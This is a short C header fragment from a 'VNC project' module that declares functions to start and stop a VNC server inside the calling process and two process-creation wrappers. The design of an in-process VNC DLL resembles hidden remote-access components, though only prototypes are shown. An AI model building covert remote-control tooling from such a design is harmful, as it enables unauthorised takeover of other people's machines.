//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: vncsrv.c
// $Revision: 137 $
// $Date: 2013-07-23 16:57:05 +0400 (Вт, 23 июл 2013) $
// description:
//	VNC-server DLL.

// Starts VNC server within the caller process
WINERROR __stdcall VncSrvStartup(VOID);

// Stops VNC server within the caller process
VOID __stdcall VncSrvCleanup(VOID);



extern BOOL WINAPI AdCreateProcessA(
				PCHAR lpApplicationName,
				PCHAR lpCommandLine,
				LPSECURITY_ATTRIBUTES lpProcessAttributes,
				LPSECURITY_ATTRIBUTES lpThreadAttributes,
				BOOL bInheritHandles,
				DWORD dwCreationFlags,
				LPVOID lpEnvironment,
				PCHAR lpCurrentDirectory,
				LPSTARTUPINFOA lpStartupInfo,
				LPPROCESS_INFORMATION lpProcessInformation
	);

extern BOOL WINAPI AdCreateProcessW(
				LPWSTR lpApplicationName,
				LPWSTR lpCommandLine,
				LPSECURITY_ATTRIBUTES lpProcessAttributes,
				LPSECURITY_ATTRIBUTES lpThreadAttributes,
				BOOL bInheritHandles,
				DWORD dwCreationFlags,
				LPVOID lpEnvironment,
				LPWSTR lpCurrentDirectory,
				LPSTARTUPINFOW lpStartupInfo,
				LPPROCESS_INFORMATION lpProcessInformation
	);


#if _UNICODE
	#define	AdCreateProcess AdCreateProcessW
#else
	#define	AdCreateProcess AdCreateProcessA
#endif